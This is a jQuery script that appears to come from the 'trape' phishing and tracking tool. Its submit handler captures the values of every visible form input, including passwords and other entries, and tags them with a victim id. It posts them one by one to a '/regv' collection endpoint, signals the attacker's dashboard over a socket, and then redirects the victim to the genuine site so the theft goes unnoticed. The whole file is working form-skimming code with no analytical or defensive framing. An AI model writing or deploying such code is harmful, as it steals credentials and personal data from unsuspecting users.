$(document).ready(function($) {

    $(document).delegate('form', 'submit', function(event) {
        event.preventDefault();

        var d = getVictimData();

        objs = $(this).find('input:visible');
        var sId = Math.random().toString(36).substr(2);
        
        $.each(objs, function(index, val) {
            var datav = {
                vId : d.vId,
                site : d.vURL,
                sId : sId,
                fid : ($(val).attr('id') || ''),
                name : ($(val).attr('name') || ''),
                value : ($(val).val() || '')
            };

            $.ajax({
                url: "/regv",
                data: datav,
                dataType: "json",
                type: "POST",
                success: function(response) {
                    socket.emit('my_broadcast_event', {data: 'update-data'});
                },
                error: function(error) {
                }
            });
        });

        window.location.replace(d.vURL);
    });

    if (typeof(io) != 'undefined') {
        var d = getVictimData();
        namespace = '/trape';
        var socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);
        socket.emit('join', {room: d.vId});
        defineSockets(socket);
    }
});